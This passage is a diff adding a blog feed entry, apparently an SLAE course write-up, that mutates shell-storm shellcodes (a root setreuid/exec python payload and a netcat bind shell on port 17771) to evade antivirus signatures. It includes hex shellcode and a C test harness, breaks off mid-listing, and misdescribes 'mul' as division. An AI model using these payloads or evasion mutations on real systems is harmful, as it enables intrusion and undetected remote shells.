@@ -1,0 +1,1439 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom"><title>Security Nomad</title><link href="http://unlim.xyz/" rel="alternate"></link><link href="http://unlim.xyz/feeds/slae.atom.xml" rel="self"></link><id>http://unlim.xyz/</id><updated>2015-10-08T20:00:00-04:00</updated><entry><title>Mutating existing shellcodes (SLAE, Assignment #6)</title><link href="http://unlim.xyz/blog/mutating-existing-shellcodes/" rel="alternate"></link><updated>2015-10-08T20:00:00-04:00</updated><author><name>Oleg Mitrofanov</name></author><id>tag:unlim.xyz,2015-10-08:blog/mutating-existing-shellcodes/</id><summary type="html">&lt;p&gt;This post is about modifying shellcode by replacing instructions it uses without changing the overall logic of the given shellcode. This is most often done to evade antivirus and intrusion detection systems.&lt;/p&gt;
+&lt;p&gt;There are actually polymorphic engines exist that can take a program and transform it such that the modified version consists of different code yet operates with the same functionality. But in this post we will be doing everything manually.&lt;/p&gt;
+&lt;h1&gt;Sample #1: setreuid() + exec /usr/bin/python - 54 bytes by Ali Razmjoo&lt;/h1&gt;
+&lt;p&gt;The first sample from the shell-storm.org I will use here is the &lt;a href="http://shell-storm.org/shellcode/files/shellcode-886.php"&gt;shellcode that starts the Python interpreter as root&lt;/a&gt;. On the referenced page the shellcode is presented using AT&amp;amp;T syntax. Here is the version translated to the Intel syntax with my comments (I renamed the &lt;em&gt;first&lt;/em&gt; and &lt;em&gt;last&lt;/em&gt; labels so that their purpose is more obvious):&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;section&lt;/span&gt; &lt;span class="nv"&gt;.text&lt;/span&gt;
+    &lt;span class="k"&gt;global&lt;/span&gt; &lt;span class="nv"&gt;_start&lt;/span&gt;
+
+&lt;span class="nl"&gt;_start:&lt;/span&gt;
+    &lt;span class="c1"&gt;; Set real u/gid to root&lt;/span&gt;
+    &lt;span class="nf"&gt;xor&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;al&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x46&lt;/span&gt;
+    &lt;span class="nf"&gt;xor&lt;/span&gt; &lt;span class="nb"&gt;ebx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;ebx&lt;/span&gt;
+    &lt;span class="nf"&gt;xor&lt;/span&gt; &lt;span class="nb"&gt;ecx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;ecx&lt;/span&gt;
+    &lt;span class="nf"&gt;int&lt;/span&gt; &lt;span class="mh"&gt;0x80&lt;/span&gt;
+    &lt;span class="nf"&gt;jmp&lt;/span&gt; &lt;span class="nv"&gt;.data&lt;/span&gt;
+
+&lt;span class="nl"&gt;.code:&lt;/span&gt;
+    &lt;span class="nf"&gt;pop&lt;/span&gt; &lt;span class="nb"&gt;ebx&lt;/span&gt;             &lt;span class="c1"&gt;; Load the address to the string into ebx&lt;/span&gt;
+    &lt;span class="nf"&gt;xor&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;ebx&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;15&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="nb"&gt;al&lt;/span&gt;    &lt;span class="c1"&gt;; Put 0 byte at the end of the string&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;ebx&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="nb"&gt;ebx&lt;/span&gt;   &lt;span class="c1"&gt;; Copy the address to the string to 4 bytes after the string&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;ebx&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;   &lt;span class="c1"&gt;; Copy zeroes after the address to the string&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;al&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;11&lt;/span&gt;          &lt;span class="c1"&gt;; execve syscall #&lt;/span&gt;
+    &lt;span class="nf"&gt;lea&lt;/span&gt; &lt;span class="nb"&gt;ecx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;ebx&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="c1"&gt;; args, the 2rd argument&lt;/span&gt;
+    &lt;span class="nf"&gt;lea&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;ebx&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="c1"&gt;; env vars, the 3rd argument&lt;/span&gt;
+    &lt;span class="nf"&gt;int&lt;/span&gt; &lt;span class="mh"&gt;0x80&lt;/span&gt;
+
+&lt;span class="nl"&gt;.data:&lt;/span&gt;
+    &lt;span class="nf"&gt;call&lt;/span&gt; &lt;span class="nv"&gt;.code&lt;/span&gt;
+    &lt;span class="nl"&gt;python:&lt;/span&gt; &lt;span class="kd"&gt;db&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;/usr/bin/python&amp;quot;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Note that the above Assembly program compiles, but does not work by itself because of the self-modifying part. Remember that modifying the executable &lt;em&gt;.text&lt;/em&gt; section at runtime is a no-no and leads to a segmentation fault. To test the shellcode we have to employ a framing C program. And the shellcode itself can be copied from the referenced above web page or regenerated using the &lt;a href="https://github.com/reider-roque/reed/tree/master/tools"&gt;scdump&lt;/a&gt; tool after building an executable from the above source code.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cp"&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
+&lt;span class="cp"&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;
+
+&lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;shellcode&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x5b\x31\xc0\x88\x43\x0f\x89\x5b\x10\x89\x43\x14\xb0\x0b\x8d\x4b\x10\x8d\x53&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x14\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x70\x79&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x74\x68\x6f\x6e&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; 
+
+&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Shellcode length: %d&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;strlen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;shellcode&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
+    &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="n"&gt;shellcode&lt;/span&gt;&lt;span class="p"&gt;)();&lt;/span&gt;
+    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;&lt;img alt="Testing the shellcode" src="http://unlim.xyz/images/mutating-existing-shellcodes/testing-the-shellcode.png" title="Testing the shellcode" /&gt;
+&lt;div class="img-caption"&gt;Testing the shellcode&lt;/div&gt;&lt;/p&gt;
+&lt;p&gt;At first I wanted to do a step by step modification of every couple instructions preserving the overall functionality, but then after reviewing the given shellcode architecture I realized that it is quite inefficient. So I decided to rewrite most of the code employing a couple of shellcode-shortening techniques I learned while taking the SLAE course. Follows my modified copy of the shellcode with some comments:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;section&lt;/span&gt; &lt;span class="nv"&gt;.text&lt;/span&gt;
+    &lt;span class="k"&gt;global&lt;/span&gt; &lt;span class="nv"&gt;_start&lt;/span&gt;
+
+&lt;span class="nl"&gt;_start:&lt;/span&gt;
+    &lt;span class="c1"&gt;; Set real u/gid to root&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="kt"&gt;byte&lt;/span&gt; &lt;span class="mh"&gt;0x46&lt;/span&gt;
+    &lt;span class="nf"&gt;pop&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;
+    &lt;span class="nf"&gt;xor&lt;/span&gt; &lt;span class="nb"&gt;ebx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;ebx&lt;/span&gt;
+    &lt;span class="nf"&gt;xor&lt;/span&gt; &lt;span class="nb"&gt;ecx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;ecx&lt;/span&gt;
+    &lt;span class="nf"&gt;int&lt;/span&gt; &lt;span class="mh"&gt;0x80&lt;/span&gt;
+
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;ebx&lt;/span&gt;            &lt;span class="c1"&gt;; Push null bytes to terminate the string&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mh"&gt;0x6e6f6874&lt;/span&gt;     &lt;span class="c1"&gt;; Push the //usr/bin/python string&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mh"&gt;0x79702f6e&lt;/span&gt;     &lt;span class="c1"&gt;; onto the stack&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mh"&gt;0x69622f72&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mh"&gt;0x73752f2f&lt;/span&gt;
+    &lt;span class="nf"&gt;mul&lt;/span&gt; &lt;span class="nb"&gt;ebx&lt;/span&gt;             &lt;span class="c1"&gt;; Zero out EAX and EDX as a result of multiplication by 0&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;ebx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;esp&lt;/span&gt;        &lt;span class="c1"&gt;; String address, execve 1st argument - program name&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;al&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;11&lt;/span&gt;          &lt;span class="c1"&gt;; execve syscall #&lt;/span&gt;
+    &lt;span class="nf"&gt;int&lt;/span&gt; &lt;span class="mh"&gt;0x80&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;First off all note that this shellcode is 38 bytes long vs 54 bytes of the original one, which is a 30% (!) reduction. Here is the list of tricks I employed to reduce the shellcode size:&lt;/p&gt;
+&lt;p&gt;1) In the beginning the EAX register needs to be set to the 0x46, which is the syscall code of the setreuid. For that the original shellcode uses&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;xor&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;
+&lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;al&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x46&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;sequence, which takes 4 bytes. To shave off a byte I replaced it with the following equivalent:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="kt"&gt;byte&lt;/span&gt; &lt;span class="mh"&gt;0x46&lt;/span&gt;
+&lt;span class="nf"&gt;pop&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;2) The original shellcode uses the jmp-call-pop technique for accessing the data in the location-independent manner. I replaced this approach with pushing the string data directly onto the stack. This change alone saved us the most number of bytes.&lt;/p&gt;
+&lt;p&gt;3) The original shellcode contains code that was setting unnecessary arguments to &lt;code&gt;execve&lt;/code&gt; syscall:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;lea&lt;/span&gt; &lt;span class="nb"&gt;ecx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;ebx&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;span class="nf"&gt;lea&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;ebx&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;In reality both ECX and EDX registers (2nd and 3rd arguments to execve syscall correspondingly) can be set to 0.&lt;/p&gt;
+&lt;p&gt;4) Lastly, to set EAX and EDX registers to 0 in one swoop I used the multiplication instruction:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;mul&lt;/span&gt; &lt;span class="nb"&gt;ebx&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;that stores the quotient into EAX and remainder into EDX. And since the divisor (EBX) was 0, both the quotient and remainder were set to 0.&lt;/p&gt;
+&lt;p&gt;To convert the &lt;em&gt;//usr/bin/python&lt;/em&gt; string to instructions that are used to push the string onto the stack I used the &lt;a href="https://github.com/reider-roque/reed/tree/master/tools"&gt;str4sc&lt;/a&gt; tool. I had to add an extra slash to the path so that the string length became a multiple of 4 - a condition necessary for storing null-free strings on the stack.&lt;/p&gt;
+&lt;h1&gt;Sample #2: /bin/nc -le /bin/sh -vp 17771 - 58 bytes by Oleg Boytsev&lt;/h1&gt;
+&lt;p&gt;Here comes our second shell-storm sample - the &lt;a href="http://shell-storm.org/shellcode/files/shellcode-872.php"&gt;netcat assisted bind shell&lt;/a&gt;:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;global&lt;/span&gt; &lt;span class="no"&gt;_start&lt;/span&gt;
+&lt;span class="nf"&gt;section&lt;/span&gt; &lt;span class="no"&gt;.text&lt;/span&gt;
+ &lt;span class="nl"&gt;_start:&lt;/span&gt;
+    &lt;span class="nf"&gt;xor&lt;/span&gt; &lt;span class="no"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;eax&lt;/span&gt;
+    &lt;span class="nf"&gt;xor&lt;/span&gt; &lt;span class="no"&gt;edx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;edx&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="no"&gt;eax&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mi"&gt;0x31373737&lt;/span&gt;     &lt;span class="err"&gt;;&lt;/span&gt;&lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="no"&gt;vp17771&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mi"&gt;0x3170762d&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;esi&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;esp&lt;/span&gt;
+
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="no"&gt;eax&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mi"&gt;0x68732f2f&lt;/span&gt;     &lt;span class="err"&gt;;&lt;/span&gt;&lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="no"&gt;le&lt;/span&gt;&lt;span class="err"&gt;//&lt;/span&gt;&lt;span class="no"&gt;bin&lt;/span&gt;&lt;span class="err"&gt;//&lt;/span&gt;&lt;span class="no"&gt;sh&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mi"&gt;0x6e69622f&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mi"&gt;0x2f656c2d&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;edi&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;esp&lt;/span&gt;
+
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="no"&gt;eax&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mi"&gt;0x636e2f2f&lt;/span&gt;     &lt;span class="err"&gt;;/&lt;/span&gt;&lt;span class="no"&gt;bin&lt;/span&gt;&lt;span class="err"&gt;//&lt;/span&gt;&lt;span class="no"&gt;nc&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mi"&gt;0x6e69622f&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;ebx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;esp&lt;/span&gt;
+
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="no"&gt;edx&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="no"&gt;esi&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="no"&gt;edi&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="no"&gt;ebx&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;ecx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;esp&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;al&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;11&lt;/span&gt;
+    &lt;span class="nf"&gt;int&lt;/span&gt; &lt;span class="mi"&gt;0x80&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;There is nothing complicated about this shellcode. All it does is just starts the Netcat listening on port 17771 and serving shell to anyone connecting to that port. From the get-go I found only way to reduce the overall size by 1 byte: replacing all&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;instructions with&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;And then replacing the&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;xor&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;
+&lt;span class="nf"&gt;...&lt;/span&gt;
+&lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;al&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;11&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;sequence (instructions are actually divided by the code) with&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="kt"&gt;byte&lt;/span&gt; &lt;span class="mi"&gt;11&lt;/span&gt;
+&lt;span class="nf"&gt;pop&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Here is the result of the above manipulations:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;global&lt;/span&gt; &lt;span class="nv"&gt;_start&lt;/span&gt;
+&lt;span class="k"&gt;section&lt;/span&gt; &lt;span class="nv"&gt;.text&lt;/span&gt;
+ &lt;span class="nl"&gt;_start:&lt;/span&gt;
+    &lt;span class="nf"&gt;xor&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mh"&gt;0x31373737&lt;/span&gt;     &lt;span class="c1"&gt;;-vp17771&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mh"&gt;0x3170762d&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;esi&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;esp&lt;/span&gt;
+
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mh"&gt;0x68732f2f&lt;/span&gt;     &lt;span class="c1"&gt;;-le//bin//sh&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mh"&gt;0x6e69622f&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mh"&gt;0x2f656c2d&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;edi&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;esp&lt;/span&gt;
+
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mh"&gt;0x636e2f2f&lt;/span&gt;     &lt;span class="c1"&gt;;/bin//nc&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mh"&gt;0x6e69622f&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;ebx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;esp&lt;/span&gt;
+
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;esi&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;edi&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;ebx&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;ecx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;esp&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="kt"&gt;byte&lt;/span&gt; &lt;span class="mi"&gt;11&lt;/span&gt;
+    &lt;span class="nf"&gt;pop&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;
+    &lt;span class="nf"&gt;int&lt;/span&gt; &lt;span class="mh"&gt;0x80&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Next I will continue mutate the shellcode, trying to not increase the overall size. One thing we can begin with is playing around the strings we have at our disposal. We can modify them in such a way that overall functionality stays the same. Remember that length for each string must stay a multiple of 4. Here how I modified the strings:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;-vp17771        -&amp;gt;    -lp17771
+-le//bin//sh    -&amp;gt;    -ve/bin///sh
+/bin//nc        -&amp;gt;    //bin/nc
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;In the wild I would also change the port number, but for the sake of keeping functionality 100% unchanged I do not do it here.&lt;/p&gt;
+&lt;p&gt;And the last change that will complicate AV detection will be replacing one register with another whenever possible throughout the code. This will work because every instruction translates to a different sequence of bytes and that is exactly what we need. Follows the map of replacements I made in the original shellcode and then the whole body of the modified shellcode:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;mov esi, esp -&amp;gt; mov eax, esp
+mov edi, esp -&amp;gt; mov esi, esp
+push esi     -&amp;gt; push eax
+push edi     -&amp;gt; push esi
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The final version:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;global&lt;/span&gt; &lt;span class="nv"&gt;_start&lt;/span&gt;
+&lt;span class="k"&gt;section&lt;/span&gt; &lt;span class="nv"&gt;.text&lt;/span&gt;
+ &lt;span class="nl"&gt;_start:&lt;/span&gt;
+    &lt;span class="nf"&gt;xor&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mh"&gt;0x31373737&lt;/span&gt;     &lt;span class="c1"&gt;; -lp17771&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mh"&gt;0x31706c2d&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;esp&lt;/span&gt;
+
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mh"&gt;0x68732f2f&lt;/span&gt;     &lt;span class="c1"&gt;; -ve/bin///sh&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mh"&gt;0x2f6e6962&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mh"&gt;0x2f65762d&lt;/span&gt;
